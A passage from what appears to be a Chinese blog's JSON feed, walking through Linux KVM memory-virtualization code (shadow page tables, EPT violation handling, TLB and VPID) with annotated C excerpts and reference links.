class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Note, @vcpu may be NULL if @role.direct is true; see kvm_mmu_find_shadow_page. */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *__<span class=\"title\">kvm_mmu_get_shadow_page</span>(<span class=\"keyword\">struct</span> <span class=\"title\">kvm</span> *<span class=\"title\">kvm</span>,</span></span><br><span class=\"line\"><span class=\"class\">\t\t\t\t\t\t      <span class=\"keyword\">struct</span> <span class=\"title\">kvm_vcpu</span> *<span class=\"title\">vcpu</span>,</span></span><br><span class=\"line\"><span class=\"class\">\t\t\t\t\t\t      <span class=\"keyword\">struct</span> <span class=\"title\">shadow_page_caches</span> *<span class=\"title\">caches</span>,</span></span><br><span class=\"line\"><span class=\"class\">\t\t\t\t\t\t      <span class=\"title\">gfn_t</span> <span class=\"title\">gfn</span>,</span></span><br><span class=\"line\"><span class=\"class\">\t\t\t\t\t\t      <span class=\"title\">union</span> <span class=\"title\">kvm_mmu_page_role</span> <span class=\"title\">role</span>)</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_head</span> *<span class=\"title\">sp_list</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> created = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsp_list = &amp;kvm-&gt;arch.mmu_page_hash[kvm_page_table_hashfn(gfn)];</span><br><span class=\"line\"></span><br><span class=\"line\">\tsp = kvm_mmu_find_shadow_page(kvm, vcpu, gfn, sp_list, role);<span class=\"comment\">//从哈希表中查找指定gfn和role的影子页表页</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!sp) &#123; <span class=\"comment\">// 没有找到，进行创建</span></span><br><span class=\"line\">\t\tcreated = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tsp = kvm_mmu_alloc_shadow_page(kvm, caches, gfn, sp_list, role);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttrace_kvm_mmu_get_page(sp, created);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sp;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t遍历到最后一级页表，相应的表项不存在，就需要位GPA申请物理页面、填充页表项了</p>\n<p>set_pte寻找空闲的物理页，填充页表项</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">mmu_set_spte</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_memory_slot *slot,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\tu64 *sptep, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> pte_access, <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"type\">kvm_pfn_t</span> pfn, <span class=\"keyword\">struct</span> kvm_page_fault *fault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span> =</span> sptep_to_sp(sptep);</span><br><span class=\"line\">\t<span class=\"type\">int</span> level = sp-&gt;role.level;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">       </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_shadow_present_pte(*sptep)) </span><br><span class=\"line\"></span><br><span class=\"line\">\t......</span><br><span class=\"line\"></span><br><span class=\"line\">\twrprot = make_spte(vcpu, sp, slot, pte_access, gfn, pfn, *sptep, prefetch,</span><br><span class=\"line\">\t\t\t   <span class=\"literal\">true</span>, host_writable, &amp;spte);</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tmake_spte 生成新的页表项</p>\n<h2 id=\"建立好之后的寻址\"><a href=\"#建立好之后的寻址\" class=\"headerlink\" title=\"建立好之后的寻址\"></a>建立好之后的寻址</h2><p>​\t\t每次访问cr3都会触发异常</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_cr</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> exit_qualification, val;</span><br><span class=\"line\">\t<span class=\"type\">int</span> cr;</span><br><span class=\"line\">\t<span class=\"type\">int</span> reg;</span><br><span class=\"line\">\t<span class=\"type\">int</span> err;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\texit_qualification = vmx_get_exit_qual(vcpu);  <span class=\"comment\">//读取字段</span></span><br><span class=\"line\">\tcr = exit_qualification &amp; <span class=\"number\">15</span>; <span class=\"comment\">//提取字段的 0-3位，判断访问的那个控制寄存器</span></span><br><span class=\"line\">\treg = (exit_qualification &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">15</span>;<span class=\"comment\">//提取8-11位，判断guest试图加载到cr3的页表地址存储在哪个寄存器</span></span><br><span class=\"line\">\t<span class=\"keyword\">switch</span> ((exit_qualification &gt;&gt; <span class=\"number\">4</span>) &amp; <span class=\"number\">3</span>) &#123;<span class=\"comment\">//提取4、5位 判断时写还是读控制寄存器 0表示写</span></span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">0</span>: <span class=\"comment\">/* mov to cr */</span></span><br><span class=\"line\">\t\tval = kvm_register_read(vcpu, reg);</span><br><span class=\"line\">\t\ttrace_kvm_cr_write(cr, val);</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span> (cr) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\t\terr = handle_set_cr0(vcpu, val);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> kvm_complete_insn_gp(vcpu, err);</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\tWARN_ON_ONCE(enable_unrestricted_guest);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\terr = kvm_set_cr3(vcpu, val);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> kvm_complete_insn_gp(vcpu, err);</span><br><span class=\"line\">..........</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t不知道kvm_register_read读取的cr3是否存储着影子页表的地址，是的话逻辑就比较简单了，设置cr3为影子页表的地址，然后就拿到了地址映射，进行后续内存操作？？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_set_cr3</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> cr3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">.....</span><br><span class=\"line\">\tvcpu-&gt;arch.cr3 = cr3;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<h1 id=\"二、EPT\"><a href=\"#二、EPT\" class=\"headerlink\" title=\"二、EPT\"></a>二、EPT</h1><p>​\t\t简而言之：<strong>MMU完成GVA到GPA的映射（kvm不捕获异常了，guest自己处理），EPT完成GPA到HPA的映射</strong>. 引入了EPT violation异常处理EPT的缺页</p>\n<p>​\t\t具体而言：当Guest内部发生缺页异常时，CPU不再切换到Host模式了，而是由Guest自身的缺页异常处理函数处理。当地址从GVA翻译到GPA后，<strong>GPA在硬件内部从MMU流转到了EPT。</strong>如果EPT页表中存在GPA到HPA的映射，则EPA最终获取了GPA对应的HPA，将HPA送上地址总线。如果EPT中尚未建立GPA到HPA的映射，<strong>则CPU抛出EPT异常，CPU从Guest模式切换到Host模式</strong>，KVM中的EPT异常处理函数负责寻找空闲物理页面，建立EPT表中GPA到HPA的映射。</p>\n<p>​\t\tVMX在VMCS中定义了一个字段 Extended-Page-Table Pointer，KVM可以将EPT页表的位置写入这个字段，这样当CPU进入Guest模式时，就可以从这个字段读取EPT页表的位置。</p>\n<h2 id=\"EPT页表的设置\"><a href=\"#EPT页表的设置\" class=\"headerlink\" title=\"EPT页表的设置\"></a>EPT页表的设置</h2><p>vmx.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">vmx_load_mmu_pgd</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">hpa_t</span> root_hpa,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t     <span class=\"type\">int</span> root_level)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm</span> *<span class=\"title\">kvm</span> =</span> vcpu-&gt;kvm;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> update_guest_cr3 = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> guest_cr3;</span><br><span class=\"line\">\tu64 eptp;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (enable_ept) &#123;</span><br><span class=\"line\">\t\teptp = construct_eptp(vcpu, root_hpa, root_level);</span><br><span class=\"line\">\t\tvmcs_write64(EPT_POINTER, eptp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thv_track_root_tdp(vcpu, root_hpa);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!enable_unrestricted_guest &amp;&amp; !is_paging(vcpu))</span><br><span class=\"line\">\t\t\tguest_cr3 = to_kvm_vmx(kvm)-&gt;ept_identity_map_addr;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (kvm_register_is_dirty(vcpu, VCPU_EXREG_CR3))</span><br><span class=\"line\">\t\t\tguest_cr3 = vcpu-&gt;arch.cr3;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"comment\">/* vmcs.GUEST_CR3 is already up-to-date. */</span></span><br><span class=\"line\">\t\t\tupdate_guest_cr3 = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tvmx_ept_load_pdptrs(vcpu);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tguest_cr3 = root_hpa | kvm_get_active_pcid(vcpu);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (update_guest_cr3)</span><br><span class=\"line\">\t\tvmcs_writel(GUEST_CR3, guest_cr3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t通过construct_eptp构建ept，然后vmcs_write64写入vmcs，这里是将root_hpa作为了EPT的根页面，第18行，设置变量guest_cr3指向guest自己的页表，最后27行，把cr3的值写入VMCS字段，这样切入guest后，guest模式下的CPU的cr3寄存器就指向了自己的页表。</p>\n<p>​\t\t</p>\n<h2 id=\"EPT页表的构建-x2F-缺页异常处理-（GPA-HPA）\"><a href=\"#EPT页表的构建-x2F-缺页异常处理-（GPA-HPA）\" class=\"headerlink\" title=\"EPT页表的构建 &#x2F; 缺页异常处理 （GPA-HPA）\"></a>EPT页表的构建 &#x2F; 缺页异常处理 （GPA-HPA）</h2><p>​\t\tCPU需要查询EPT表来进行GPA-HPA的转换，初始情况下，guest cr3指向的地址的页表项都是空的，CPU触发EPT violation ，虚拟机产生退出，并且退出原因为<strong>EXIT_REASON_EPT_VIOLATION</strong>，会调用<strong>handle_ept_violation</strong>处理函数</p>\n<img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-3-%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/image-20230917114957653.png\" alt=\"image-20230917114957653\" style=\"zoom: 50%;\">\n\n\n\n<p>​\t\tvmx.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_violation</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> exit_qualification;</span><br><span class=\"line\">\t<span class=\"type\">gpa_t</span> gpa;</span><br><span class=\"line\">\tu64 error_code;</span><br><span class=\"line\"></span><br><span class=\"line\">\texit_qualification = vmx_get_exit_qual(vcpu);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!(to_vmx(vcpu)-&gt;idt_vectoring_info &amp; VECTORING_INFO_VALID_MASK) &amp;&amp;</span><br><span class=\"line\">\t\t\tenable_vnmi &amp;&amp;</span><br><span class=\"line\">\t\t\t(exit_qualification &amp; INTR_INFO_UNBLOCK_NMI))</span><br><span class=\"line\">\t\tvmcs_set_bits(GUEST_INTERRUPTIBILITY_INFO, GUEST_INTR_STATE_NMI);</span><br><span class=\"line\"></span><br><span class=\"line\">\tgpa = vmcs_read64(GUEST_PHYSICAL_ADDRESS);<span class=\"comment\">// vm exit前会将引发异常的GPA保存到VMCS的该字段，这里进行读取</span></span><br><span class=\"line\">.......</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> kvm_mmu_page_fault(vcpu, gpa, error_code, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t经过一系列检查和设置后进入kvm_mmu_page_fault处理函数，这里就检查了mmio这种错误，如果不是的话，会进入下一个处理函数kvm_mmu_do_page_fault</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> noinline <span class=\"title function_\">kvm_mmu_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa, u64 error_code,</span></span><br><span class=\"line\"><span class=\"params\">\t\t       <span class=\"type\">void</span> *insn, <span class=\"type\">int</span> insn_len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">....</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = RET_PF_INVALID;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(error_code &amp; PFERR_RSVD_MASK)) &#123;</span><br><span class=\"line\">\t\tr = handle_mmio_page_fault(vcpu, cr2_or_gpa, direct);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r == RET_PF_EMULATE)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> emulate;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r == RET_PF_INVALID) &#123;</span><br><span class=\"line\">\t\tr = kvm_mmu_do_page_fault(vcpu, cr2_or_gpa,</span><br><span class=\"line\">\t\t\t\t\t  lower_32_bits(error_code), <span class=\"literal\">false</span>,</span><br><span class=\"line\">\t\t\t\t\t  &amp;emulation_type);</span><br><span class=\"line\"></span><br><span class=\"line\">.....</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EXPORT_SYMBOL_GPL(kvm_mmu_page_fault);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tkvm_mmu_do_page_fault</p>\n<p>mmu_internal.h   这里会进入kvm_tdp_page_fault(上面的影子页表就进入else了)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_do_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\tu32 err, <span class=\"type\">bool</span> prefetch, <span class=\"type\">int</span> *emulation_type)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (IS_ENABLED(CONFIG_RETPOLINE) &amp;&amp; fault.is_tdp)</span><br><span class=\"line\">\t\tr = kvm_tdp_page_fault(vcpu, &amp;fault);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tr = vcpu-&gt;arch.mmu-&gt;page_fault(vcpu, &amp;fault);</span><br><span class=\"line\"></span><br><span class=\"line\">.....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tkvm_tdp_page_fault, 目前还不是很了解tdp，但走这两条路都能到最后的地址映射</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_tdp_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_page_fault *fault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">.....</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_X86_64</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tdp_mmu_enabled)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_tdp_mmu_page_fault(vcpu, fault);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> direct_page_fault(vcpu, fault);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tkvm_tdp_mmu_page_fault中的kvm_faultin_pfn是GPA到HPA的重要函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">kvm_tdp_mmu_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t  <span class=\"keyword\">struct</span> kvm_page_fault *fault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">\tr = kvm_faultin_pfn(vcpu, fault, ACC_ALL);</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tdirect_page_fault的最后会走到direct_map函数，direct_map是EPT页表构建过程中的关键函数, 建立映射，感觉一些主体逻辑和 FNAME(fetch)有点像</p>\n<h1 id=\"三、TLB缓存\"><a href=\"#三、TLB缓存\" class=\"headerlink\" title=\"三、TLB缓存\"></a>三、TLB缓存</h1><p>​\t\tEPT：CPU使用TLB（Translation Lookaside Buffer）缓存线性虚拟地址到物理地址的映射，地址转换时CPU先根据GPA先查找TLB，如果未找到映射的HPA，将根据页表中的映射填充TLB，再进行地址转换。</p>\n<p>​\t\t影子页表方案：不同Guest的vCPU切换执行时需要刷新TLB，严重影响了内存访问效率。因此，Intel引入了VPID（Virtual-Processor Identifier）技术在硬件上为TLB增加一个标志，每个TLB表项与一个VPID关联，唯一对应一个vCPU，当vCPU切换时可根据VPID找到并保留已有的TLB表项，减少TLB刷新。</p>\n<h2 id=\"VPID\"><a href=\"#VPID\" class=\"headerlink\" title=\"VPID\"></a>VPID</h2><p>​\t\tVPID是一种硬件级的对TLB资源管理的优化。通过在硬件上为每个TLB项增加一个标志，来标识不同的虚拟处理器地址空间，从而区分开VMM以及不同虚拟机的不同处理器的TLB。避免了每次切换都使得TLB全部失效。</p>\n<p>​\t\tVT-x 通过在VMCS中增加两个域来支持VPID，一个是VMCS中的enable VPID域，该域决定是否开启VPID功能。第二个是VPID域，用于标识VMCS对应的TLB。VMM本身也需要一个VPID，VT-x规定虚拟处理器标志0被指定用于VMM自身。</p>\n<p>capabilities.h中有一个关于内存两大特性的结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vmx_capability</span> &#123;</span></span><br><span class=\"line\">\tu32 ept;</span><br><span class=\"line\">\tu32 vpid;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t会在hardware_setup函数中设置相关特性是否开启</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> __init <span class=\"type\">int</span> <span class=\"title function_\">hardware_setup</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> (!cpu_has_vmx_vpid() || !cpu_has_vmx_invvpid() ||</span><br><span class=\"line\">\t    !(cpu_has_vmx_invvpid_single() || cpu_has_vmx_invvpid_global()))</span><br><span class=\"line\">\t\tenable_vpid = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t剩下的事好像就没软件什么事了，归硬件去操作</p>\n<h1 id=\"四、参考\"><a href=\"#四、参考\" class=\"headerlink\" title=\"四、参考\"></a>四、参考</h1><p><a href=\"https://www.cnblogs.com/LoyenWang/p/13943005.html\">https://www.cnblogs.com/LoyenWang/p/13943005.html</a> 不过这个是arm的</p>\n<p><a href=\"https://mp.weixin.qq.com/s/fLSSbtPjx29Gg-IJfgnbZw\">https://mp.weixin.qq.com/s/fLSSbtPjx29Gg-IJfgnbZw</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/108425561\">https://zhuanlan.zhihu.com/p/108425561</a>  TLB原理</p>\n<p><a href=\"http://www.xiongfuli.com/%E8%99%9A%E6%8B%9F%E5%8C%96/2013-06/KVM-Implementation.html\">http://www.xiongfuli.com/%E8%99%9A%E6%8B%9F%E5%8C%96/2013-06/KVM-Implementation.html</a></p>\n<p><a href=\"https://luohao-brian.gitbooks.io/interrupt-virtualization/content/kvmzhi-nei-cun-xu-ni531628-kvm-mmu-virtualization.html\">https://luohao-brian.gitbooks.io/interrupt-virtualization/content/kvmzhi-nei-cun-xu-ni531628-kvm-mmu-virtualization.html</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1975756\">https://cloud.tencent.com/developer/article/1975756</a> </p>\n<p><a href=\"https://royhunter.github.io/2014/06/18/KVM-EPT/\">https://royhunter.github.io/2014/06/18/KVM-EPT/</a></p>\n",
            "tags": [
                "KVM"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-40-racecondition%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-40-racecondition%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/",
            "title": "pwn入门-40-racecondition条件竞争漏洞初探",
            "date_published": "2023-09-16T06:22:49.000Z",
